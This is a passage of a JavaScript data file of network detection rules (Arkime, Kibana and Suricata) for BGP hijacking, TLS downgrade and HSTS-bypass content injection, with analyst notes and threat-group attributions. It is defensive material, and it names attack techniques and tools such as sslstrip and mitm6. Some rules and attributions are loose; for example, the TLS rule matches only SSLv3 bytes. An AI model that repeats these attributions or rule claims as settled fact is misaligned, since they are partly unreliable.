          { cls: "apt-ru", name: "Sandworm", note: "Has used DNS-based attacks against Ukrainian infrastructure including DNS server compromise enabling on-path injection." },
          { cls: "apt-mul", name: "Multi", note: "DNS race-condition injection is documented in academic security research and CISA telecommunications security advisories." }
        ],
        cite: "MITRE ATT&CK T1659, industry reporting"
      },
      {
        sub: "T1659 - BGP Hijacking",
        indicator: "BGP UPDATE from unexpected peer - route hijack attempt",
        arkime: `protocols == bgp
&& port.dst == 179
&& bgp.message-type == UPDATE
&& bgp.peer-as != $KNOWN_PEER_ASNS
&& bgp.nlri-prefix == $YOUR_PREFIXES`,
        kibana: `network.protocol: bgp
AND destination.port: 179
AND bgp.message_type: "UPDATE"
AND NOT bgp.peer_as: $KNOWN_PEER_ASNS
AND bgp.nlri_prefix: $YOUR_PREFIXES`,
        suricata: `alert tcp $EXTERNAL_NET any
  -> $BGP_PEERS 179
  (msg:"TA0001 T1659 BGP UPDATE
    from unexpected peer
    possible hijack";
  flow:established,to_server;
  content:"|02|"; offset:18;
  depth:1;
  classtype:trojan-activity;
  sid:9165907; rev:1;)`,
        notes: "BGP hijacking redirects internet traffic for entire IP prefixes through adversary infrastructure - historically used by nation-state actors for traffic interception, surveillance, and on-path content injection. Detection: BGP UPDATE messages (message type 2 = '|02|' at offset 18) from peers not in your known peer ASN list, especially announcing your own prefixes. Most enterprises won't see BGP at the network capture level - this is primarily for ISPs, hosting providers, and large enterprises with their own ASNs. Use BGPmon, RIPE RIS, and BGPstream for external monitoring of your prefix announcements. Detection of your prefixes being announced from unexpected ASNs is the primary indicator of an active hijack against you.",
        apt: [
          { cls: "apt-cn", name: "APT10", note: "BGP hijacking incidents have been attributed to Chinese state-affiliated actors (China Telecom AS4134) including the 2010 incident where 15% of internet traffic was routed through Chinese infrastructure for 18 minutes." },
          { cls: "apt-ru", name: "Sandworm", note: "Capability for routing-layer attacks documented in operations against telecommunications infrastructure." },
          { cls: "apt-cn", name: "Volt Typhoon", note: "Has demonstrated network infrastructure compromise capability that could enable BGP-level attacks against US critical infrastructure." },
          { cls: "apt-mul", name: "Multi", note: "BGP hijacks are documented in numerous incidents reported by Cloudflare, RIPE, and academic researchers - both nation-state operations and criminal cryptocurrency theft." }
        ],
        cite: "MITRE ATT&CK T1659, BGPmon advisories, academic research"
      },
      {
        sub: "T1659 - TLS Downgrade / HSTS Bypass",
        indicator: "TLS handshake using deprecated version - SSLv3 / TLSv1.0 / TLSv1.1 from internal client",
        arkime: `ip.src == $INTERNAL
&& protocols == tls
&& tls.version == [
  SSLv3 || TLSv1.0
  || TLSv1.1
]
&& port.dst == 443
&& ip.dst != $LEGACY_INTERNAL`,
        kibana: `source.ip: $INTERNAL
AND tls.version: (
  "SSLv3" OR "TLS 1.0"
  OR "TLS 1.1"
)
AND destination.port: 443
AND NOT destination.ip:
  $LEGACY_INTERNAL`,
        suricata: `alert tls $HOME_NET any
  -> $EXTERNAL_NET any
  (msg:"TA0001 T1659 TLS handshake
    using deprecated version
    possible downgrade attack";
  flow:established,to_server;
  content:"|16 03|"; depth:2;
  content:"|03 00|"; offset:9;
  depth:2;
  classtype:policy-violation;
  sid:9165908; rev:1;)`,
        notes: "TLS downgrade attacks force a connection to use deprecated TLS versions (SSLv3/POODLE, TLSv1.0/BEAST, TLSv1.1) which have known cryptographic weaknesses. Modern browsers and OS reject these by default - any internal client negotiating these versions to external servers indicates either a downgrade attack, a misconfigured client, or legacy software that needs upgrading. Build a $LEGACY_INTERNAL allowlist for known-legacy internal services that genuinely require old TLS, and alert on everything else. Zeek ssl.log captures TLS version explicitly. For external destinations, modern services (Google, Microsoft, AWS) all support TLS 1.3 - any negotiation to TLS 1.0/1.1 with these services is highly suspicious.",
        apt: [
          { cls: "apt-ru", name: "Midnight Blizzard", note: "Documented use of TLS downgrade and protocol manipulation in advanced operations against Microsoft 365 and Azure infrastructure." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Uses TLS protocol manipulation as part of AiTM proxy infrastructure to maintain compatibility with vulnerable client implementations." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Has used TLS downgrade against academic and NGO sector targets for traffic interception." },
          { cls: "apt-mul", name: "Multi", note: "TLS downgrade attacks (POODLE, BEAST, FREAK, Logjam) are documented in academic cryptographic research and remain exploitable against unpatched legacy systems." }
        ],
        cite: "MITRE ATT&CK T1659, T1557, academic cryptographic research"
      },
      {
        sub: "T1659 - TLS Downgrade / HSTS Bypass",
        indicator: "HTTP request to HSTS-listed domain - bypass attempt or initial connection injection",
        arkime: `ip.src == $INTERNAL
&& protocols == http
&& http.method == GET
&& http.host == $HSTS_PRELOAD_DOMAINS
&& port.dst == 80`,
        kibana: `source.ip: $INTERNAL
AND http.request.method: GET
AND url.domain: $HSTS_PRELOAD_DOMAINS
AND destination.port: 80`,
        suricata: `alert http $HOME_NET any
  -> $EXTERNAL_NET 80
  (msg:"TA0001 T1659 HTTP probe
    to HSTS-listed domain bypass
    attempt";
  flow:established,to_server;
  content:"GET"; http.method;
  pcre:"/Host:\\s*(www\\.)?(google|
    microsoft|github|cloudflare|
    facebook|amazon|apple)\\.com/i";
  http.header;
  classtype:policy-violation;
  sid:9165909; rev:1;)`,
        notes: "HSTS preload list domains (google.com, microsoft.com, github.com, cloudflare.com, facebook.com, amazon.com, apple.com, and thousands of others) are hardcoded in modern browsers as HTTPS-only - browsers will refuse to make HTTP connections to these domains. An HTTP request to an HSTS preload domain from a modern browser indicates either a non-browser client (curl/wget/python script - possibly malicious), an outdated browser without the HSTS preload list, or a sophisticated SSL stripping attack with a custom client. Maintain $HSTS_PRELOAD_DOMAINS list synced from the Chromium HSTS preload list. The HTTP probe itself is suspicious - successful exploitation would produce subsequent HTTPS to a different IP than the legitimate domain.",
        apt: [
          { cls: "apt-mul", name: "Multi", note: "SSL stripping attacks (sslstrip, mitm6) are documented in academic security research and offensive security tooling. HSTS preload list adoption has dramatically reduced SSL stripping effectiveness against major sites, but legacy clients and non-preloaded domains remain vulnerable." }
        ],
        cite: "MITRE ATT&CK T1659, T1557, Chromium HSTS preload list"
      }
    ]
  }
];
